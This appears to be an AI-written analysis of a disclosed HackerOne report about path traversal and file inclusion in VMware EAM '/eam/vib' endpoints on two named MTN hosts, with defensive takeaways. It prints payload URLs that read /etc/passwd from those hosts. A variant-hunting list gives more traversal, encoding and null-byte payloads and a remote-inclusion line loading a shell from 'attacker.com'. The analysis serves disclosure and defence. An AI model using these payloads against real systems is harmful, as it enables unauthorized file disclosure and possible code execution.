# 2x Remote File Inclusion in VMware Instances

## Metadata
- **Source:** HackerOne
- **Report:** 1069105 | https://hackerone.com/reports/1069105
- **Submitted:** 2020-12-31
- **Reporter:** 0x0luke
- **Program:** HackerOne (VMware/MTN)
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Remote File Inclusion (RFI), Path Traversal, Improper Input Validation
- **CVEs:** None
- **Category:** uncategorised

## Summary
Two VMware instances running on MTN infrastructure contained unvalidated file inclusion vulnerabilities in the /eam/vib endpoint. Attackers could read arbitrary files like /etc/passwd by manipulating the 'id' parameter, exposing sensitive system information and potentially enabling RCE.

## Attack scenario
1. Attacker identifies VMware EAM (ESXi Agent Manager) instances at nmc.vc.mtn.co.ug and h28a.n1.ips.mtn.co.ug
2. Attacker discovers the /eam/vib endpoint accepts an 'id' parameter without validation
3. Attacker crafts URL with path traversal payload: /eam/vib?id=/etc/passwd
4. Server processes request and returns contents of /etc/passwd file
5. Attacker extracts usernames, UIDs, and potentially password hashes
6. Attacker leverages disclosed system information for further exploitation or lateral movement

## Root cause
The /eam/vib endpoint fails to properly validate and sanitize the 'id' parameter, allowing path traversal sequences to escape intended directory restrictions. Input is directly used in file access operations without whitelisting or path canonicalization.

## Attacker mindset
An opportunistic attacker scanning for VMware instances would recognize the /eam/vib endpoint as a common interface. Testing basic path traversal payloads (/etc/passwd) reveals the vulnerability with minimal effort, providing immediate value through information disclosure and potential pivot points for RCE.

## Defensive takeaways
- Implement strict input validation: whitelist allowed characters and reject path traversal sequences (../, ..\ absolute paths)
- Use canonical path resolution to prevent bypass attempts via encoding or symbolic links
- Apply principle of least privilege: restrict application file access to specific directories only
- Implement access controls and authentication on sensitive endpoints like /eam/vib
- Use security frameworks that prevent file inclusion by design (avoid dynamic file loading based on user input)
- Deploy WAF rules to detect and block path traversal attempts
- Maintain VMware appliances at latest patch levels and security baselines
- Monitor file access logs for suspicious patterns indicating exploitation attempts

## Variant hunting
Test other VMware endpoints (/vsphere-client, /ui, /h5ngc) with path traversal payloads
Attempt null byte injection: /eam/vib?id=/etc/passwd%00.txt
Test encoding variations: URL encoding, double encoding, Unicode encoding of traversal sequences
Probe for log file access: /eam/vib?id=../../var/log/vmware/eam/eam.log
Test configuration file disclosure: /eam/vib?id=../../etc/vmware/config or /eam/vib?id=../../opt/vmware/etc/
Attempt remote file inclusion if protocol handlers are supported: /eam/vib?id=http://attacker.com/shell.php
Test other parameter names: ?file=, ?path=, ?include=, ?load=
Enumerate VMware service files: /eam/vib?id=../../var/run/vmware/ for active process information

## MITRE ATT&CK
- T1190
- T1083
- T1552.001
- T1033
- T1526

## Notes
VMware EAM is a critical component in vSphere infrastructure. RFI vulnerabilities in such systems can lead to complete environment compromise. The presence of identical vulnerabilities across multiple instances suggests systemic configuration issue rather than isolated misconfiguration. Report lacks patch timeline and confirmation of remediation.

## Full report
<details><summary>Expand</summary>

## Summary:
2x Remote file inclusion within your VMware Instances

##Hosts: 

nmc.vc.mtn.co.ug
h28a.n1.ips.mtn.co.ug

## Steps To Reproduce:
Navigate to the URLs given below, /etc/passwd will be displayed.

https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
https://h28a.n1.ips.mtn.co.ug/eam/vib?id=/etc/passwd

## Impact

An attacker is able to view sensitive files on the server hosting this content and could potentially elevate this to a remote code execution.

</details>

---
*Analysed by Claude on 2026-05-24*
